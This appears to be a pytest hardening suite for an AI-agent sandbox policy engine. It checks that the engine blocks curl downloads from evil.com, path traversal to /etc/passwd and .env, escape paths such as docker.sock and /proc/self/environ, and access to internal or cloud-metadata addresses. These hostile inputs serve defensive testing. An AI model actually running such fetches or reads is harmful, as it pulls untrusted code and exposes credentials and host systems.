"""Hardening suite v0.1: P1-P6 bypass + enforcement tests (20+ scenarios)."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from agentguard.policy import load_policy, PolicyEngine
from agentguard.sandbox import GuardedSandbox


def pe():
    return PolicyEngine(load_policy("agentguard.yaml"))


# P1: structured program semantics
def test_p1_curl_variants_blocked():
    p = pe()
    assert not p.check_command("curl https://evil.com").allowed
    assert not p.check_command("curl.exe https://evil.com").allowed
    assert not p.check_command("/usr/bin/curl https://evil.com").allowed
    assert not p.check_command("mycurl https://evil.com").allowed
    assert not p.check_command("curl-malicious").allowed


def test_p1_git_semantics():
    p = pe()
    assert p.check_command("git status").allowed
    assert not p.check_command("git status").needs_approval
    d = p.check_command("git push origin main")
    assert d.allowed and d.needs_approval
    d2 = p.check_command(["git", "push", "origin", "main"])
    assert d2.allowed and d2.needs_approval
    assert not p.check_command("git-upload-pack").allowed


# P2: traversal matrix
def test_p2_traversal_matrix():
    p = pe()
    for bad in ["../secret", "../../etc/passwd", "./workspace/../.env",
                "workspace/../../etc/passwd", "/etc/passwd", "/workspace-evil/x"]:
        assert not p.check_read(bad).allowed, bad
    assert not p.check_write("workspace2/file").allowed
    assert not p.check_write("workspace-evil/hack.txt").allowed
    assert p.check_read("workspace/app.py").allowed


# P3: sandbox escape (policy + real enforcement)
def test_p3_escape_paths_blocked():
    p = pe()
    for bad in ["/etc/passwd", "/proc/self/environ", "/sys/kernel", "/dev/mem",
                "/var/run/docker.sock", "//./pipe/dockerDesktopLinuxEngine"]:
        assert not p.check_read(bad).allowed, bad


def test_p3_enforcement_real(tmp_path):
    sb = GuardedSandbox(pe(), log_path=tmp_path / "a.jsonl")
    # blocked read raises AND yields no contents
    try:
        sb.read_file(".env")
        assert False, "should have raised"
    except PermissionError:
        pass
    # blocked exec never runs: canary file must not appear
    canary = tmp_path / "pwned.txt"
    try:
        sb.run_command(f"curl https://evil.com -o {canary}")
        assert False, "should have raised"
    except PermissionError:
        pass
    assert not canary.exists()


def test_p3_dockerfile_not_privileged():
    df = Path("Dockerfile").read_text()
    assert "--privileged" not in df
    assert "/var/run/docker.sock" not in df


# P4: network bypass matrix
def test_p4_network_matrix():
    p = pe()
    for bad in ["127.0.0.1", "::1", "0.0.0.0", "10.0.0.1", "172.16.0.1",
                "192.168.1.1", "169.254.169.254", "localhost", "evil-example.com"]:
        assert not p.check_network(bad).allowed, bad
    d = p.check_network("169.254.169.254")
    assert "metadata" in d.reason
    assert p.check_network("api.github.com").allowed
    assert p.check_network("https://api.github.com:443/x").allowed


# Secrets: contents never leak (P-audit)
def test_secret_contents_never_logged(tmp_path):
    token = "AKIA-FAKE-TOKEN-12345"
    sb = GuardedSandbox(pe(), log_path=tmp_path / "a.jsonl")
    try:
        sb.write_file("workspace/token.txt", token)
        sb.read_file("workspace/token.txt")
    finally:
        try:
            Path("workspace/token.txt").unlink()
        except Exception:
            pass
    try:
        sb.read_file(".env")
    except PermissionError:
        pass
    blob = (tmp_path / "a.jsonl").read_text()
    assert token not in blob
    assert "[REDACTED]" in blob
